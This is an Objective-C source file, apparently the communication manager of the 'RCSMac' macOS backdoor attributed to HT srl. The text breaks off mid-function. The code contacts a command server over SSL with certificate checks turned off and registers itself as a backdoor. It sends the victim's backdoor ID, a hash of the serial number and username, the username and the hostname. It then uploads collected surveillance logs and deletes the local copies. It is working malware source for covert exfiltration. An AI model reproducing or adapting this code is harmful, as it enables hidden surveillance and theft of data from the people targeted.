/*
 * RCSMac - Communication Manager
 *  This is the network communication manager which will manage the syncing
 *  phase
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 22/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <stdlib.h>

#import "RCSMCommunicationManager.h"
#import "RCSMTaskManager.h"
#import "RCSMEncryption.h"
#import "RCSMLogManager.h"

#import "NSMutableData+AES128.h"
#import "NSString+SHA1.h"

#import "RCSMCommon.h"

//#define DEBUG
//#define DEBUG_VERBOSE_1
//#define DEBUG_PROFILING
//#define DEBUG_ERRORS

#define SAMPLING_RATE 15


//static NSLock *communicationLock;

@interface RCSMCommunicationManager (hidden)

- (BOOL)_handshake;
- (BOOL)_identifyOurself;

- (BOOL)_sendChallenge;
- (BOOL)_sendCommand: (u_int)aCommand;
- (BOOL)_sendCommandData: (NSData *)aData;

- (BOOL)_checkChallengeResponse;
- (BOOL)_getServerChallenge;

- (u_int)_receiveCommand;
- (BOOL)_receiveCommandData: (NSMutableData *)aData size: (int)dataSize;

- (int)_poolForResponse;

- (BOOL)_sendLog: (u_int)anAgentID isAgent: (BOOL)isAgent;
- (BOOL)_sendLogs;
- (BOOL)_prepareAndUploadLocalFileLog: (NSString *)aFilePath;

- (BOOL)_receiveNewConfiguration;
- (BOOL)_uploadFiles;
- (BOOL)_downloadFile;
- (BOOL)_downloadUpgrade;

@end

@implementation RCSMCommunicationManager (hidden)

- (BOOL)_handshake
{
#ifdef DEBUG
  infoLog(ME, @"Performing handshake: %@", mServerIP);
#endif
  
  NSHost *host;
  NSString *regex = @"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}";
  NSPredicate *regexPredicate = [NSPredicate predicateWithFormat: @"SELF MATCHES %@", regex];
  
  if ([regexPredicate evaluateWithObject: mServerIP] == YES)
    {
#ifdef DEBUG
      warnLog(ME, @"Host is numeric");
#endif
      
      host = [NSHost hostWithAddress: mServerIP];
    }
  else
    {
#ifdef DEBUG
      warnLog(ME, @"Host is a string");
#endif
      
      host = [NSHost hostWithName: mServerIP];
    }
  
  //NSHost *host = [NSHost hostWithAddress: @"192.168.0.11"];
  //NSHost *host = [NSHost hostWithAddress: @"172.16.180.129"];
  //NSHost *host = [NSHost hostWithAddress: @"192.168.1.159"];
  //NSHost *host = [NSHost hostWithAddress: @"192.168.1.147"];
  //NSHost *host = [NSHost hostWithAddress: @"172.16.180.131"];
  
  //
  // Enabling SSL and starting communication
  //
  [NSStream getStreamsToHost: host
                        port: 443
                 inputStream: &iStream
                outputStream: &oStream ];
  
  if (iStream == nil && oStream == nil)
    {
#ifdef DEBUG
      errorLog(ME, @"Can't resolve/connect to %@", mServerIP);
#endif
      
      return NO;
    }
    
  [iStream retain];
  [oStream retain];
  
  //
  // NegotiatedSSL = Highest level security protocol that can be negotiated
  // StreamSSLPeerName = Avoid errors where certificate peer name doesn't match
  //                     the peer name
  //
  NSDictionary *sslSettings = [NSDictionary dictionaryWithObjectsAndKeys:
                               (NSString *)kCFStreamSocketSecurityLevelNegotiatedSSL,
                               kCFStreamSSLLevel,
                               [NSNumber numberWithBool: YES], kCFStreamSSLAllowsExpiredCertificates,
                               [NSNumber numberWithBool: YES], kCFStreamSSLAllowsExpiredRoots,
                               [NSNumber numberWithBool: YES], kCFStreamSSLAllowsAnyRoot,
                               [NSNumber numberWithBool: NO],  kCFStreamSSLValidatesCertificateChain,
                               //[host hostName], kCFStreamSSLPeerName,
                               nil];
  
  [sslSettings retain];
#ifdef DEBUG_VERBOSE_1
  infoLog(ME, @"sslSettings: %@", sslSettings);
#endif
  
  CFReadStreamSetProperty((CFReadStreamRef)iStream,
                          kCFStreamPropertySSLSettings, sslSettings);
  CFWriteStreamSetProperty((CFWriteStreamRef)oStream, 
                           kCFStreamPropertySSLSettings, sslSettings);
  [sslSettings release];
  
  /*
  [iStream setDelegate: self];
  [oStream setDelegate: self];
  
  [iStream scheduleInRunLoop: [NSRunLoop currentRunLoop] forMode: NSDefaultRunLoopMode];
  [oStream scheduleInRunLoop: [NSRunLoop currentRunLoop] forMode: NSDefaultRunLoopMode];
  */
  
  [iStream open];
  [oStream open];
  
  // Blocking since we're dealing with asynchronous streams
  //if ([self _poolForResponse] == 0)
  //{
#ifdef DEBUG
  infoLog(ME, @"Starting handshake");
#endif
  
  //
  // In order to communicate on the SSL port the first command needs to be an
  // HTTP POST with the first 8 bytes of the gChallenge (signature)
  //
  NSString *_postData     = [NSString stringWithUTF8String: gChallenge];
  NSMutableData *postData = [[NSMutableData alloc] init];
  NSString *postString    = [NSString stringWithFormat: @"%@%@",
                             [_postData substringWithRange: NSMakeRange(0, 8)], SSL_FIRST_COMMAND];

  [postData appendData: [[NSString stringWithFormat: @"Content-Length: %d\r\n\r\n", [postString length]]
                         dataUsingEncoding: NSUTF8StringEncoding]];
  [postData appendData: [postString dataUsingEncoding: NSUTF8StringEncoding]];

#ifdef DEBUG
  infoLog(ME, @"Sending Initial SSL Packet");
#endif
  
  if ([self _sendCommandData: postData] == FALSE)
    return NO;
  
  [postData release];
  
  //
  // Send Challenge
  //
  if ([self _sendChallenge] == YES)
    {
      //
      // Check Response
      //
      if ([self _checkChallengeResponse] == YES)
        {
#ifdef DEBUG
          warnLog(ME, @"Check Challenge Response OK");
#endif
        }
      else
        {
#ifdef DEBUG_ERRORS
          errorLog(ME, @"Error while checking challenge response");
#endif
          [self _sendCommand: PROTO_BYE];
          
          return NO;
        }
      
      //
      // Get Server Challenge
      //
      if ([self _getServerChallenge] == NO)
        return NO;
#ifdef DEBUG
      warnLog(ME, @"getServerChallenge went ok");
#endif
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"_sendChallenge returned NO");
#endif
      
      [self _sendCommand: PROTO_BYE];
      
      return NO;
    }
  
  return YES;
}

- (BOOL)_identifyOurself
{
  //
  // Send backdoor version
  //
#ifdef DEBUG
  infoLog(ME, @"Sending Backdoor Version");
#endif
  NSMutableData *backdoorVersion = [NSMutableData dataWithBytes: (void *)&gVersion
                                                         length: sizeof(gVersion)];
  
  u_int buffer[2];
  int temp = sizeof(gVersion);
  
  buffer[0] = PROTO_VERSION;
  // PROTO_VERSION len
  buffer[1] = temp;
  
  NSData *tempData = [NSData dataWithBytes: &buffer
                                    length: sizeof(buffer)];

#ifdef DEBUG_PROFILING
  NSDate *startTime;
  startTime = [NSDate date];
  infoLog(ME, @"before PROTO_VERSION: %@", startTime);
#endif
  
  if ([self _sendCommandData: tempData] == FALSE)
    return FALSE;
  
#ifdef DEBUG_PROFILING
  NSTimeInterval interval;
  interval = [[NSDate date] timeIntervalSinceDate: startTime];
  infoLog(ME, @"intervalAfter PROTO_VERSION: %f", fabs(interval));
#endif
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  char nullTerminator = '\0';
  [backdoorVersion appendBytes: &nullTerminator
                        length: 1];
  
  CCCryptorStatus success = 0;
  
#ifdef DEBUG
  infoLog(ME, @"backdoorVersion: %@", backdoorVersion);
  infoLog(ME, @"backdoorVersion len: %d", [backdoorVersion length]);
#endif
  
  //
  // Encrypt backdoorVersion and send it again
  //
  success = [backdoorVersion encryptWithKey: mTempChallenge];
  
  if (success == kCCSuccess || success == 1)
    {
#ifdef DEBUG_PROFILING
      startTime = [NSDate date];
      infoLog(ME, @"before VERSION: %@", startTime);
#endif
      
      if ([self _sendCommandData: backdoorVersion] == FALSE)
        return FALSE;
      
#ifdef DEBUG_PROFILING
      interval = [[NSDate date] timeIntervalSinceDate: startTime];
      infoLog(ME, @"intervalAfter VERSION: %f", fabs(interval));
#endif
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"Error while encrypting backdoorVersion: %d", success);
#endif
      
      return FALSE;
    }
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  //
  // Send Proto SubType
  //
#ifdef DEBUG
  infoLog(ME, @"Sending Backdoor SubType");
#endif
  if ([self _sendCommand: PROTO_SUBTYPE] == FALSE)
    return FALSE;
  
  NSString *_subType = @"MACOS";
  NSMutableData *subType = [[NSMutableData alloc] initWithData:
                            [_subType dataUsingEncoding: NSUTF8StringEncoding]];
  
  // PROTO_SUBTYPE len
  temp = [_subType lengthOfBytesUsingEncoding: NSUTF8StringEncoding]
          + sizeof(nullTerminator);
  tempData = [NSData dataWithBytes: (void *)&temp
                            length: sizeof(u_int)];
  
  if ([self _sendCommandData: tempData] == FALSE)
    {
      [subType release];
      
      return FALSE;
    }
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  [subType appendBytes: &nullTerminator
                length: 1];
  
  success = 0;
  
  //
  // Encrypt backdoor subType and send it again
  //
  success = [subType encryptWithKey: mTempChallenge];
  
  if (success == kCCSuccess || success == 1)
    {
      if ([self _sendCommandData: subType] == FALSE)
        {
          [subType release];
          return FALSE;
        }
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"Error while encrypting backdoor subType");
#endif
      [subType release];
      
      return FALSE;
    }
  
  [subType release];
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;  
  
  //
  // Send Unique Backdoor ID
  //
#ifdef DEBUG
  infoLog(ME, @"Sending Unique Backdoor ID");
#endif
  if ([self _sendCommand: PROTO_ID] == FALSE)
    return FALSE;
  
  // PROTO_ID len
  temp = 16;
  tempData = [NSData dataWithBytes: (void *)&temp
                            length: sizeof(u_int)];
  
  if ([self _sendCommandData: tempData] == FALSE)
    return FALSE;
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  NSMutableData *backdoorID = [NSMutableData dataWithBytes: (void *)&gBackdoorID
                                                    length: 16];
  
  success = 0;
  success = [backdoorID encryptWithKey: mTempChallenge];
  
  if (success == kCCSuccess || success == 1)
    {
      if ([self _sendCommandData: backdoorID] == FALSE)
        {
#ifdef DEBUG_ERRORS
          errorLog(ME, @"Error while sending backdoor ID");
#endif
          
          return FALSE;
        }
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"Error while encrypting backdoorID");
#endif
      
      return FALSE;
    }
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  //
  // Send backdoor Instance ID
  //
#ifdef DEBUG
  infoLog(ME, @"Sending Backdoor Instance ID");
#endif
  if ([self _sendCommand: PROTO_INSTANCE] == FALSE)
    return FALSE;
  
  // PROTO_INSTANCE len
  temp = 20;
  tempData = [NSData dataWithBytes: (void *)&temp
                            length: sizeof(u_int)];
  
  if ([self _sendCommandData: tempData] == FALSE)
    return FALSE;
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  CFStringRef serialNumber;
  getSystemSerialNumber(&serialNumber);
  
  NSMutableString *instanceID = [[NSMutableString alloc] initWithString: (NSString *)serialNumber];
  CFRelease(serialNumber);
  
  NSString *userName = NSUserName();
  
  [instanceID appendString: userName];
  
#ifdef DEBUG
  infoLog(ME, @"instanceID: %@", instanceID);
  infoLog(ME, @"instanceID Sha1: %@", [instanceID sha1HexHash]);
#endif
  NSMutableData *tempMutableData = [NSMutableData dataWithData:
                                    [instanceID dataUsingEncoding: NSUTF8StringEncoding]];
#ifdef DEBUG
  infoLog(ME, @"Encrypting Instance ID");
#endif
  NSMutableData *tempShaMutableData = [NSMutableData dataWithData: [tempMutableData sha1Hash]];
  
  success = 0;
  success = [tempShaMutableData encryptWithKey: mTempChallenge];
  
  if (success == kCCSuccess || success == 1)
    {
      if ([self _sendCommandData: tempShaMutableData] == FALSE)
        {
          [instanceID release];
          return FALSE;
        }
    }
  else
    {
#ifdef DEBUG
      errorLog(ME, @"Error while encrypting Instance ID");
#endif
      [instanceID release];
      
      return FALSE;
    }
  
  [instanceID release];
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  //
  // Now it's the username/hostname turn
  //
#ifdef DEBUG
  infoLog(ME, @"Sending username");
#endif
  if ([self _sendCommand: PROTO_USERID] == FALSE)
    return FALSE;
  
  temp = [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
          + sizeof(nullTerminator);
  tempData = [NSData dataWithBytes: (void *)&temp
                            length: sizeof(u_int)];

  // Username clear text UTF16 LE length
  if ([self _sendCommandData: tempData] == FALSE)
    return FALSE;
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  tempMutableData = [NSMutableData dataWithData:
                     [userName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  [tempMutableData appendBytes: &nullTerminator
                        length: 1];
  
  success = 0;
  success = [tempMutableData encryptWithKey: mTempChallenge];
  
  if (success == kCCSuccess || success == 1)
    {
      //
      // Send encrypted username
      //
      if ([self _sendCommandData: tempMutableData] == FALSE)
        return FALSE;
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"Error while encrypting username");
#endif
      
      return FALSE;
    }
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  //
  // Hostname
  //
#ifdef DEBUG
  infoLog(ME, @"Sending hostname");
#endif
  char tempHost[100];
  NSString *hostName;
  if (gethostname(tempHost, 100) == 0)
    hostName = [NSString stringWithUTF8String: tempHost];
  else
    hostName = @"EMPTY";
  
  if ([self _sendCommand: PROTO_DEVICEID] == FALSE)
    return FALSE;
  
  temp = [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
          + sizeof(nullTerminator);
  tempData = [NSData dataWithBytes: (void *)&temp
                            length: sizeof(u_int)];
  
#ifdef DEBUG
  infoLog(ME, @"hostname not enc length: %d", temp);
#endif
  
  // Hostname clear text UTF16 LE length
  if ([self _sendCommandData: tempData] == FALSE)
    return FALSE;
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
  
  tempMutableData = [NSMutableData dataWithData:
                     [hostName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  [tempMutableData appendBytes: &nullTerminator
                        length: 1];
  
  success = 0;
  success = [tempMutableData encryptWithKey: mTempChallenge];
  
  if (success == kCCSuccess || success == 1)
    {
#ifdef DEBUG
      infoLog(ME, @"hostname enc length: %d", [tempMutableData length]);
      infoLog(ME, @"hostname : %@", tempMutableData);
#endif
      
      //
      // Send encrypted hostname
      //
      if ([self _sendCommandData: tempMutableData] == FALSE)
        return FALSE;
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"Error while encrypting hostname");
#endif
      
      return FALSE;
    }
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
#ifdef DEBUG
  infoLog(ME, @"Sending PROTO_SOURCEID");
#endif
  
  //
  // Send blank source id since protocol expect it
  //
  if ([self _sendCommand: PROTO_SOURCEID] == FALSE)
    return FALSE;
  
#ifdef DEBUG
  infoLog(ME, @"Sending SOURCEID Size");
#endif

  NSString *sourceID = @"ar45y";
  temp      = [sourceID lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
               + sizeof(nullTerminator);
  tempData  = [NSData dataWithBytes: (void *)&temp
                             length: sizeof(u_int)];
  
  // sourceID clear text UTF16 LE length
  if ([self _sendCommandData: tempData] == FALSE)
    return FALSE;
  
  if ([self _receiveCommand] != PROTO_OK)
    return FALSE;
#ifdef DEBUG
  warnLog(ME, @"Received PROTO_OK");
#endif
  tempMutableData = [NSMutableData dataWithData:
                     [sourceID dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  [tempMutableData appendBytes: &nullTerminator
                        length: 1];
  success = 0;
  success = [tempMutableData encryptWithKey: mTempChallenge];
  
  if (success == kCCSuccess || success == 1)
    {
      //
      // Send encrypted sourceID
      //
#ifdef DEBUG
      infoLog(ME, @"Sending sourceID String");
#endif
      if ([self _sendCommandData: tempMutableData] == FALSE)
        return FALSE;
      
      if ([self _receiveCommand] != PROTO_OK)
        return FALSE;
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"Error while encrypting sourceID");
#endif
      
      return FALSE;
    }
#ifdef DEBUG
  warnLog(ME, @"Received LAST PROTO_OK");
#endif
  return TRUE;
}

- (BOOL)_sendChallenge
{
  u_int randomNumber, i;
  
  srandom(time(NULL));
  
  for (i = 0; i < 16; i += 4)
    {
      randomNumber = random();
      [mChallenge appendBytes: (const void *)&randomNumber
                       length: sizeof(randomNumber)];
    }
  
#ifdef DEBUG
  infoLog(ME, @"challenge clear-text: %@", mChallenge);
#endif
  
  if ([self _sendCommand: PROTO_CHALLENGE] == NO)
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"Error while sending challenge");
#endif
      
      return NO;
    }
#ifdef DEBUG
  else
    infoLog(ME, @"Challenge command sent");
#endif
  if ([self _sendCommandData: mChallenge] == NO)
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"Error while sending challenge data");
#endif
      
      return NO;
    }
#ifdef DEBUG
  else
    infoLog(ME, @"Challenge data sent");
#endif
  
  return YES;
}

- (BOOL)_sendCommand: (u_int)aCommand
{
#ifdef DEBUG
  infoLog(ME, @"Sending Command: %x", aCommand);
#endif
  while (1)
    {
      if ([oStream hasSpaceAvailable])
        {
          const uint8_t *rawString = (void *)&aCommand;
          
          [oStream write: rawString
               maxLength: sizeof(int)];
          //[oStream close];
          
          return TRUE;
        }
    }
  
  return FALSE;
}

- (BOOL)_sendCommandData: (NSData *)aData
{
  NSDate *startDate = [NSDate date];
  
#ifdef DEBUG_PROFILING
  NSDate *startTime = [NSDate date];
  infoLog(ME, @"startTimeData: %@", startTime);
#endif

#ifdef DEBUG_VERBOSE_1
  infoLog(ME, @"Sending Command Data: %@", aData);
#endif DEBUG_VERBOSE_1

  int dataLength        = [aData length];
  int bytesWritten      = 0;
  u_int leftBytesLength = 0;
  mByteIndex            = 0;
  
  do
    {
      if ([oStream hasSpaceAvailable])
        {
          const uint8_t *rawBytes = (const uint8_t *)[aData bytes];
          rawBytes += mByteIndex;
          
          leftBytesLength = ((dataLength - mByteIndex >= (mBandwidthLimit / SAMPLING_RATE))
                             ? mBandwidthLimit / SAMPLING_RATE
                             : (dataLength - mByteIndex));
#ifdef DEBUG_VERBOSE_1
          infoLog(ME, @"leftBytesLength: %d", leftBytesLength);
#endif
          uint8_t buf[leftBytesLength];
          memcpy(buf, rawBytes, leftBytesLength);
          
          bytesWritten = [oStream write: buf
                              maxLength: leftBytesLength];
          
          mByteIndex += bytesWritten;
          
#ifdef DEBUG_VERBOSE_1
          infoLog(ME, @"Sent: %d", bytesWritten);
          infoLog(ME, @"byteIndex: %d", mByteIndex);
          infoLog(ME, @"dataLength: %d", dataLength);
#endif
        }
      else
        {
          if (fabs([[NSDate date] timeIntervalSinceDate: startDate]) >= MAX_SOCKET_WAIT_TIME_SEND)
            {
#ifdef DEBUG
              errorLog(ME, @"Connection timed out while syncing");
#endif
              
              return FALSE;
            }
          
          usleep(80000);
        }
      
#ifdef DEBUG_PROFILING
      NSTimeInterval interval = [[NSDate date] timeIntervalSinceDate: startTime];
      infoLog(ME, @"interval: %f", fabs(interval));
#endif
    } while (mByteIndex < dataLength);
  
  return TRUE;
}

- (BOOL)_checkChallengeResponse
{
#ifdef DEBUG
  infoLog(ME, @"Checking challenge response");
#endif
  
  if ([self _receiveCommand] != PROTO_RESPONSE)
    return FALSE;
  
#ifdef DEBUG
  warnLog(ME, @"Received PROTO_RESPONSE command");
#endif

  NSMutableData *responseData = [[NSMutableData alloc] init];
  NSData *temp = [NSData dataWithBytes: &gChallenge
                                length: strlen(gChallenge)];
  
  CCCryptorStatus success = 0;
  success = [mChallenge encryptWithKey: temp];
  
#ifdef DEBUG
  infoLog(ME, @"gChallenge: %@", temp);
  infoLog(ME, @"mChallenge: %@", mChallenge);
  infoLog(ME, @"success: %d", success);
#endif
  
  if (success == kCCSuccess || success == 1)
    {
#ifdef DEBUG
      infoLog(ME, @"mChallenge encrypted correctly");
#endif
      
      //int dataSize = CC_MD5_DIGEST_LENGTH;
      
      if ([self _receiveCommandData: responseData size: CC_MD5_DIGEST_LENGTH] == TRUE)
        {
#ifdef DEBUG
          infoLog(ME, @"mChallenge: %@", mChallenge);
          infoLog(ME, @"responseData: %@", responseData);
#endif
          if ([responseData isEqualToData: mChallenge])
            {
              [responseData release];
              
              //
              // Send back an OK
              //
              if ([self _sendCommand: PROTO_OK] == FALSE)
                return FALSE;
              else
                return TRUE;
            }
          else
            {
#ifdef DEBUG_ERRORS
              errorLog(ME, @"Challenge doesn't matches");
              infoLog(ME, @"responseData: %@", responseData);
              infoLog(ME, @"mChallenge: %@", mChallenge);
#endif
              [responseData release];
            }
        }
      else
        {
#ifdef DEBUG_ERRORS
          errorLog(ME, @"An error occurred while receiving command data");
#endif
        }
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"An error occurred while encrypting log data");
#endif
    }
  
  return FALSE;
}

- (BOOL)_getServerChallenge
{
#ifdef DEBUG
  infoLog(ME, @"Getting server Challenge");
#endif
  // At this stage mChallenge should already be encrypted in-place
  NSMutableData *responseData = [[NSMutableData alloc] init];
  
  if ([self _receiveCommand] != PROTO_CHALLENGE)
    return NO;
  
  //int dataSize = CC_MD5_DIGEST_LENGTH;
#ifdef DEBUG
  infoLog(ME, @"Receiving command Data");
#endif
  if ([self _receiveCommandData: responseData size: CC_MD5_DIGEST_LENGTH] == TRUE)
    {
#ifdef DEBUG
      infoLog(ME, @"Received command Data");
#endif
      // Temp Code
      //unsigned char result[CC_MD5_DIGEST_LENGTH];
      //CC_MD5(gChallenge, strlen(gChallenge), result);
      //NSData *temp = [NSData dataWithBytes: result length: CC_MD5_DIGEST_LENGTH];
      
      NSData *temp = [NSData dataWithBytes: &gChallenge
                                    length: strlen(gChallenge)];
      CCCryptorStatus success = 0;
      
      success = [responseData encryptWithKey: temp];
      
#ifdef DEBUG
      infoLog(ME, @"Sending PROTO_LOG/FILE command");
#endif
      if ([self _sendCommand: PROTO_RESPONSE] == FALSE)
        return NO;
#ifdef DEBUG
      warnLog(ME, @"PROTO_RESPONSE sent in getServerChallenge");
#endif
      if ([self _sendCommandData: responseData] == FALSE)
        return NO;
#ifdef DEBUG
      warnLog(ME, @"responseData sent in getServerChallenge");
#endif
      [responseData release];
      
      //
      // Wait for server OK
      //
      if ([self _receiveCommand] != PROTO_OK)
        return NO;
#ifdef DEBUG
      warnLog(ME, @"PROTO_OK received in getServerChallenge");
#endif
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"An error occurred while receiving command data (getServerChallenge)");
#endif
    }
  
  return YES;
}

- (u_int)_receiveCommand
{
  int flag = 0;
  int len  = 0;
  uint8_t buf[sizeof(int)];
  
  NSDate *startDate = [NSDate date];
  
  do
    {
      while ([iStream hasBytesAvailable])
        {
          len = [iStream read: buf maxLength: sizeof(int)];
#ifdef DEBUG_VERBOSE_1
          infoLog(ME, @"len: %d", len);
#endif
          flag = 1;
          
          if (len > 0)
            {
#ifdef DEBUG
              debugLog(ME, @"Received Command: %d", *(unsigned int *)buf);
#endif  
     
              if (len == 4)
                return *(unsigned int *)buf;
                //break;
            }
          else
            {
#ifdef DEBUG
              warnLog(ME, @"no bytes");
#endif
              
              return PROTO_INVALID;
            }
        }
      
      if (fabs([[NSDate date] timeIntervalSinceDate: startDate]) == MAX_SOCKET_WAIT_TIME_RECV)
        {
#ifdef DEBUG_ERRORS
          errorLog(ME, @"Connection timed out while syncing");
#endif
          
          return PROTO_INVALID;
        }
      
      usleep(40000);
      
      /*
      if (flag == 0)
        sleep(1);*/
      /*  
      waitTime++;
      if (waitTime == MAX_SOCKET_WAIT_TIME)
        {
          NSLog(@"Connection timed out while syncing");
          return PROTO_INVALID;
        }
      
      sleep(1);
      */
      //if (flag == 0)
        //sleep(1);
    }
  while (flag == 0);
  
  return *(unsigned int *)buf;
}

- (BOOL)_receiveCommandData: (NSMutableData *)aData size: (int)dataSize
{
#ifdef DEBUG
  infoLog(ME, @"Receiving command data");
#endif
  int flag = 0;
  int len  = (dataSize > 0) ? dataSize : 1024;
  int bytesReceived = 0;
  uint8_t buf[len];
  
  NSDate *startDate = [NSDate date];
  
  //NSMutableData *_data = [[NSMutableData alloc] init];
#ifdef DEBUG_VERBOSE_1
  infoLog(ME, @"dataSize: %d", dataSize);
#endif
  
  do
    {
      //NSLog(@"Polling");
      
      while ([iStream hasBytesAvailable])
        {
          len = [iStream read: buf maxLength: len];
          flag = 1;
          if (len > 0)
            {
#ifdef DEBUG
              warnLog(ME, @"Received Command Data! (%d)", len);
#endif
              [aData appendBytes: (const void *)buf length: len];
              
              bytesReceived += len;
              
              if (bytesReceived == dataSize)
                return TRUE;
            }
          else
            {
#ifdef DEBUG
              warnLog(ME, @"no bytes");
#endif
            }
        }
      
      if (fabs([[NSDate date] timeIntervalSinceDate: startDate]) == MAX_SOCKET_WAIT_TIME_RECV)
        {
#ifdef DEBUG_ERRORS
          errorLog(ME, @"Connection timed out while syncing");
#endif
          return PROTO_INVALID;
        }
      
      /*
      waitTime++;
      if (waitTime == MAX_SOCKET_WAIT_TIME)
        {
          NSLog(@"Connection timed out while syncing");
          return PROTO_INVALID;
        }
        */
      //sleep(1);
/*      if (flag == 0)
        sleep(1);*/
    }
  while (bytesReceived < dataSize);
  
#ifdef DEBUG
  infoLog(ME, @"received: %@", aData);
#endif
  
  if (aData != nil)
    return TRUE;
  else
    return FALSE;
}

- (int)_poolForResponse
{
  int waitTime = 0;
  
  do
    {
      //NSLog(@"waitTime: %d", waitTime);
      if ([oStream hasSpaceAvailable])
        return 0;
      
      waitTime++;
      sleep(1);
    }
  while (waitTime <= MAX_SOCKET_WAIT_TIME_RECV);
  
  return -1;
}

- (BOOL)_sendLog: (u_int)anAgentID isAgent: (BOOL)isAgent
{
  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];

  NSEnumerator *enumerator = [logManager getSendQueueEnumerator];
  id anObject;
  
  if (enumerator == nil)
    {
#ifdef DEBUG
      warnLog(ME, @"There are no logs dude");
#endif
      
      if (isAgent == YES)
        {
          if ([self _sendCommand: PROTO_LOG_END] == FALSE)
            return FALSE;
        }
      else
        {
          if ([self _sendCommand: PROTO_ENDFILE] == FALSE)
            return FALSE;
        }
      
      if ([self _receiveCommand] != PROTO_OK)
        return FALSE;
      
      return TRUE;
    }
  
  while (anObject = [enumerator nextObject])
    {
      if ([[anObject objectForKey: @"agentID"] intValue] == anAgentID)
        {
          //[communicationLock lock];
          NSString *logName = [anObject objectForKey: @"logName"];
#ifdef DEBUG
          infoLog(ME, @"Sending log: %@", logName);
#endif
          //[communicationLock unlock];
          
          NSData *logData = [NSData dataWithContentsOfFile: logName];
          
          [logName release];
          
          int fileSize = [logData length];
          u_int buffer[2];
          
          if (isAgent == YES)
            buffer[0] = PROTO_LOG;
          else
            buffer[0] = PROTO_FILE;
          
          buffer[1] = fileSize;
          
          NSData *tempData = [NSData dataWithBytes: &buffer
                                            length: sizeof(buffer)];
#ifdef DEBUG
          infoLog(ME, @"Sending PROTO_LOG/FILE command");
#endif
          if ([self _sendCommandData: tempData] == FALSE)
            {
              return FALSE;
            }
#ifdef DEBUG
          infoLog(ME, @"Waiting for Response");
#endif
          if ([self _receiveCommand] != PROTO_OK)
            {
              return FALSE;
            }
#ifdef DEBUG
          infoLog(ME, @"Sending logData");
#endif
          if ([self _sendCommandData: logData] == FALSE)
            {
              return FALSE;
            }
#ifdef DEBUG
          infoLog(ME, @"Waiting for Response");
#endif
          if ([self _receiveCommand] != PROTO_OK)
            {
              return FALSE;
            }
          
          //[communicationLock lock];
          NSString *logPath = [[[NSFileManager defaultManager] currentDirectoryPath]
                               stringByAppendingPathComponent:
                               [anObject objectForKey: @"logName"]];
          //[communicationLock unlock];
#ifdef DEBUG_VERBOSE_1
          infoLog(ME, @"logPath: %@", logPath);
#endif
          if ([[NSFileManager defaultManager] removeItemAtPath: logPath
                                                         error: nil] == YES)
#ifdef DEBUG
              warnLog(ME, @"Log file removed correctly");
#endif
          
          //
          // Remove log entry from the send queue
          //
          [logManager removeSendLog: [[anObject objectForKey: @"agentID"] intValue]
                          withLogID: [[anObject objectForKey: @"logID"] intValue]];
          
          break;
        }
    }
#ifdef DEBUG
  warnLog(ME, @"Log sent successfully");
#endif
  if (isAgent == YES)
    {
#ifdef DEBUG_VERBOSE_1
      infoLog(ME, @"Is Agent");
#endif
      
      if ([self _sendCommand: PROTO_LOG_END] == FALSE)
        return FALSE;
    }
  
  return TRUE;
}

- (BOOL)_sendLogs
{
  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
#ifdef DEBUG
  infoLog(ME, @"Syncing logs");
#endif
  
  //
  // Close active logs and move them to the send queue
  //
  if ([logManager closeActiveLogs: TRUE] == YES)
    {
#ifdef DEBUG
      infoLog(ME, @"Active logs closed correctly");
#endif
    }
  else
    {
#ifdef DEBUG_ERRORS
      errorLog(ME, @"An error occurred while closing active logs");
#endif
    }
  
  NSEnumerator *enumerator = [logManager getSendQueueEnumerator];
  id anObject;
  
  if (enumerator == nil)
    {
#ifdef DEBUG
      warnLog(ME, @"No logs in queue");
#endif
      
      //return TRUE;
    }
  else
    {
      //
      // Send all the logs in the send queue
      //
      while (anObject = [enumerator nextObject])
        {
          [anObject retain];
          
          //[communicationLock lock];
          NSString *logName = [[anObject objectForKey: @"logName"] copy];
#ifdef DEBUG
          infoLog(ME, @"Sending log: %@", logName);
#endif
          //[communicationLock unlock];
          
          if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
            {
              NSData *logData = [NSData dataWithContentsOfFile: logName];
              
              int fileSize = [logData length];
              u_int buffer[2];
              
              buffer[0] = PROTO_LOG;
              buffer[1] = fileSize;
              
              NSData *tempData = [NSData dataWithBytes: &buffer
                                                length: sizeof(buffer)];
#ifdef DEBUG
              infoLog(ME, @"Sending PROTO_LOG command");
#endif
